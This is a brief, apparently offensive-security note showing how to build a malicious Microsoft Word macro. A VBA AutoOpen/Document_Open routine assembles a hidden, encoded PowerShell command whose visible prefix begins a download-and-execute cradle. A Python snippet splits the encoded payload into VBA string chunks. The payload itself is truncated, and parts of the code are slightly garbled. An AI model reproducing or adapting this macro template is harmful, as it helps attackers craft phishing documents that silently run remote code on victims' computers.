### Microsoft Word Example
```
Sub AutoOpen()

	MyMacro

End Sub

Sub_ _Document_Open()

	MyMacro

End Sub

Sub MyMacro()

	Dim Str As String
	Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
		Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
		...
		Str = Str + "A== "

End Sub
```

Python script to create the string above:
```
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):

print("Str = Str + " + '"' + str[i:i+n] + '"')
```


